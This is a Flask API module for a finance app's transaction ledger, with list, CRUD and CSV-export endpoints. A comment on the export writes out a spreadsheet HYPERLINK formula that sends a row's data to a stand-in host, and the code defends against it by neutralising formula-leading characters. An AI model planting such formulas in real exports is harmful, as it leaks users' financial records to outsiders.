"""The transaction ledger.

The list and the single-record endpoints deliberately return different
shapes. The list carries category_name, because that is what a table shows;
the single record carries category_id, because that is what an edit form
needs to preselect a dropdown.
"""

import csv
import io
from datetime import datetime

from flask import Response, jsonify, request

from server import money, operations
from server.auth import current_currency, money_places, require_user
from server.errors import NotFound, ValidationError
from server.routes.api import api
from server.validators import Validator

LIST_FIELDS = ["id", "date", "category", "amount", "type", "description",
               "account", "transfer_group"]
RECORD_FIELDS = ["id", "date", "category_id", "amount", "type", "description",
                 "account_id", "transfer_group"]
TYPES = ["Income", "Expense"]


def _read_submission(payload):
    """Validate a transaction body and return its cleaned fields."""
    fields = Validator(payload)
    places = money_places()
    values = {
        "txn_date": fields.past_date("date"),
        "category_id": fields.integer("category_id", minimum=1),
        "amount": fields.amount(places=places),
        "txn_type": fields.choice("type", TYPES),
        "description": fields.text("description", required=False, max_length=255),
        # Optional: a client that does not know about accounts still writes
        # a valid transaction, and the operation puts it on the default one.
        "account_id": fields.integer("account_id", required=False, minimum=1),
    }
    fields.raise_if_invalid()

    # Tags ride along with the row rather than needing a second request.
    # They are read outside the Validator because a list of ids is not one
    # of the shapes it describes, and because an absent key has to mean
    # "leave them alone" while an empty list means "take them all off".
    raw = payload.get("tag_ids")
    if raw is None:
        values["tag_ids"] = None
    elif isinstance(raw, list):
        try:
            values["tag_ids"] = [int(one) for one in raw]
        except (TypeError, ValueError):
            raise ValidationError({"tag_ids": "Tag ids must be whole numbers."})
    else:
        raise ValidationError({"tag_ids": "Send a list of tag ids."})
    return values


def _read_filters():
    """Read the search parameters off the query string.

    Anything unreadable is dropped rather than rejected. A filter arrives
    from a URL that a person may have edited or shared, and answering a
    typo'd date with a 422 instead of a list is a worse experience than
    quietly ignoring it -- these narrow a result set, they do not write
    anything.
    """
    args = request.args

    def decimal(name):
        value = money.to_decimal(args.get(name))
        return value if value is not None else None

    def whole(name):
        raw = (args.get(name) or "").strip()
        return int(raw) if raw.isdigit() else None

    def date(name):
        raw = (args.get(name) or "").strip()
        try:
            return datetime.strptime(raw, "%Y-%m-%d").date()
        except ValueError:
            return None

    kind = args.get("type")
    return {
        "q": args.get("q"),
        "date_from": date("from"),
        "date_to": date("to"),
        "txn_type": kind if kind in TYPES else None,
        "category_id": whole("category_id"),
        "account_id": whole("account_id"),
        "tag_id": whole("tag_id"),
        "min_amount": decimal("min"),
        "max_amount": decimal("max"),
        # Both are looked up in a whitelist inside the operation; an unknown
        # value there falls back to the default rather than reaching SQL.
        "sort": args.get("sort"),
        "direction": args.get("direction"),
    }


@api.get("/transactions")
def list_transactions():
    """The ledger, filtered and paged.

    Answers {items, page} rather than a bare array. A list endpoint that
    returns an array has nowhere to put the total, and adding one later
    breaks every client that was indexing into it.
    """
    user_id = require_user()
    filters = _read_filters()

    page = max(1, int(request.args.get("page") or 1))
    per_page = request.args.get("per_page")
    per_page = int(per_page) if (per_page or "").isdigit() else operations.DEFAULT_PER_PAGE
    per_page = max(1, min(per_page, operations.MAX_PER_PAGE))

    rows, total = operations.search_transactions(user_id, filters, page, per_page)

    items = money.rows(LIST_FIELDS, rows, money_places())
    # One query for the whole page rather than one per row: twenty-five
    # extra round trips to a hosted database costs more than the page does.
    carried = operations.tags_for_transactions(
        user_id, [item["id"] for item in items])
    for item in items:
        item["tags"] = carried.get(item["id"], [])

    return jsonify({
        "items": items,
        "page": {
            "number": page,
            "per_page": per_page,
            "total": total,
            # Computed here so every client does not re-derive it, and
            # rounds up: 26 rows at 25 a page is two pages, not one.
            "pages": max(1, -(-total // per_page)),
        },
    })


@api.get("/transactions/<int:transaction_id>")
def read_transaction(transaction_id):
    """One transaction, in the shape an edit form needs."""
    user_id = require_user()
    record = operations.get_transaction_by_id(user_id, transaction_id)
    if record is None:
        raise NotFound()
    body = money.row(RECORD_FIELDS, record, money_places())
    body["tags"] = operations.tags_for_transactions(
        user_id, [transaction_id]).get(transaction_id, [])
    return jsonify(body)


@api.post("/transactions")
def create_transaction():
    """Record a transaction."""
    user_id = require_user()
    values = _read_submission(request.get_json(silent=True) or {})
    transaction_id = operations.add_transaction(
        user_id, values["txn_date"], values["category_id"], values["amount"],
        values["txn_type"], values["description"], values["account_id"])
    if transaction_id is None:
        # add_transaction only writes when both the category and the account
        # belong to this user, so a None return means one of the ids was
        # not theirs to use.
        raise ValidationError({"category_id": "No such category."})

    if values["tag_ids"]:
        operations.set_transaction_tags(user_id, transaction_id, values["tag_ids"])
    return jsonify({"ok": True, "id": transaction_id}), 201


@api.patch("/transactions/<int:transaction_id>")
def edit_transaction(transaction_id):
    """Replace a transaction's fields."""
    user_id = require_user()
    values = _read_submission(request.get_json(silent=True) or {})
    if not operations.update_transaction(user_id, transaction_id, values["txn_date"],
                                         values["category_id"], values["amount"],
                                         values["txn_type"], values["description"],
                                         values["account_id"]):
        # Either the transaction is not theirs or the category is not; both
        # answer the same way, so neither confirms another account's ids.
        raise NotFound()

    # None means the caller said nothing about tags, so they are left alone.
    # An empty list is a caller saying "no tags", which must be able to
    # clear them.
    if values["tag_ids"] is not None:
        operations.set_transaction_tags(user_id, transaction_id, values["tag_ids"])
    return jsonify({"ok": True})


@api.delete("/transactions/<int:transaction_id>")
def remove_transaction(transaction_id):
    """Delete a transaction."""
    user_id = require_user()
    if not operations.delete_transaction(user_id, transaction_id):
        raise NotFound()
    return jsonify({"ok": True})


# Characters that make a spreadsheet treat a cell as a formula rather than
# as text. A description of "=1+1" is data here and a live formula in Excel;
# '=HYPERLINK("http://example/"&A1,"click")' quietly sends the row it sits in
# to whoever wrote it. Prefixing with an apostrophe keeps the text readable
# and inert.
FORMULA_LEADERS = ("=", "+", "-", "@", "\t", "\r")

# Byte order mark. Without it Excel opens the file in the local codepage and
# turns a rupee sign into mojibake.
BOM = "﻿"


def _inert(value):
    """Render one cell so that no spreadsheet will execute it."""
    text = "" if value is None else str(value)
    return "'" + text if text.startswith(FORMULA_LEADERS) else text


@api.get("/transactions/export.csv")
def export_transactions():
    """The filtered ledger as a CSV file.

    Takes exactly the same query string as the list, so whatever is on
    screen is what downloads. Exporting a different set from the one being
    looked at is a good way to hand somebody the wrong figures.

    Every matching row is written, not the current page: a page is a reading
    convenience, and nobody wants a spreadsheet in instalments.
    """
    user_id = require_user()
    rows, _ = operations.search_transactions(
        user_id, _read_filters(), page=1, per_page=operations.MAX_PER_PAGE)

    places = money_places()
    code = current_currency()

    buffer = io.StringIO()
    # QUOTE_ALL rather than the default: a description containing a comma or
    # a newline is entirely ordinary, and quoting everything means never
    # having to be right about which ones needed it.
    writer = csv.writer(buffer, quoting=csv.QUOTE_ALL, lineterminator="\r\n")
    writer.writerow(["Date", "Account", "Category", "Type", "Amount", "Currency",
                     "Description", "Transfer"])

    # By name, not by position. This loop used to unpack the tuple, and every
    # column added to the query silently shifted what each variable meant --
    # the same trap money.row() exists to avoid, and the one that put the
    # wrong figures in the portfolio report in Phase 6.
    at = {name: index for index, name in enumerate(LIST_FIELDS)}

    for row in rows:
        writer.writerow([
            row[at["date"]].isoformat(),
            _inert(row[at["account"]] or ""),
            _inert(row[at["category"]]),
            row[at["type"]],
            # The bare number, not the formatted one: a spreadsheet has to be
            # able to sum this column, and "₹1,400.00" is a string to it.
            money.serialise(row[at["amount"]], places),
            code,
            _inert(row[at["description"]]),
            # Which two rows are one movement between accounts. Without it a
            # transfer reads in a spreadsheet as unexplained money leaving
            # one account and arriving in another.
            row[at["transfer_group"]] or "",
        ])

    stamp = datetime.now().strftime("%Y-%m-%d")
    return Response(
        BOM + buffer.getvalue(),
        # content_type, not mimetype: Flask appends its own charset to a
        # mimetype, and "text/csv; charset=utf-8; charset=utf-8" is what
        # comes out.
        content_type="text/csv; charset=utf-8",
        headers={"Content-Disposition":
                 f'attachment; filename="spendincheck-{stamp}.csv"'},
    )
